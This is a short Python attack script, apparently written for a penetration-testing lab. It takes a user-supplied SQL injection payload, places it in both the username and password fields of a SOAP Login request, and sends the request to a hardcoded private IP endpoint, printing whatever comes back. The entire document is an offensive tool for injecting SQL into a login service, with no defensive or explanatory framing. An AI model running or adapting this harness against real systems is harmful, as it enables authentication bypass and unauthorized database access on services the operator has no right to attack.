import requests

# Ask the user to input the SQLi payload
sqli_payload = input("Enter the SQL injection payload: ")

# SOAP envelope for the Login operation
soap_envelope = f"""
<soapenv:Envelope xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
xmlns:tns="http://tempuri.org/">
   <soapenv:Body>
      <tns:LoginRequest>
         <tns:username>{sqli_payload}</tns:username>
         <tns:password>{sqli_payload}</tns:password>
      </tns:LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>
"""

# Endpoint URL for the SOAP service (replace with the correct URL)
url = "http://10.129.202.133:3002/wsdl"  # Replace with actual URL

# Set headers for the SOAP request
headers = {
    "SOAPAction":'"Login"'
}

# Send the POST request with the crafted payload
response = requests.post(url, data=soap_envelope, headers=headers)

# Print the response to analyze
if response.status_code == 200:
    print("Response:")
    print(response.text)
else:
    print("Request failed with status code:", response.status_code)

